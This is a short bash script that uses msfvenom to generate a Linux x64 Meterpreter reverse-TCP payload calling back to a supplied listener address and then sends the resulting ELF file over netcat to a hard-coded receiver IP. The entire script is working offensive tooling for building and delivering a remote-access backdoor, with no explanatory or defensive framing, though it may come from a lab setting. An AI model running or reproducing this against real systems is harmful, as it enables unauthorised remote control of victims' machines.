#!/bin/bash

# Variables
LHOST="$1"  # Sender IP
LPORT="4444"           # Listener Port for msfvenom
FILE_PATH="/home/kali/Documents/meterpreter_reverse_x64.elf"
RECEIVER_IP="192.168.0.28"  # Receiver IP
RECEIVER_PORT="1234"        # Port to send the file to

# Create the payload file
echo "Creating meterpreter payload..."
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > "$FILE_PATH"

if [ $? -eq 0 ]; then
    echo "Payload created successfully at $FILE_PATH."
else
    echo "Failed to create payload. Exiting."
    exit 1
fi

# Send the file using netcat
echo "Sending the file to $RECEIVER_IP:$RECEIVER_PORT..."
cat "$FILE_PATH" | nc -w 3 "$RECEIVER_IP" "$RECEIVER_PORT"

if [ $? -eq 0 ]; then
    echo "File sent successfully."
else
    echo "Failed to send file."
    exit 1
fi
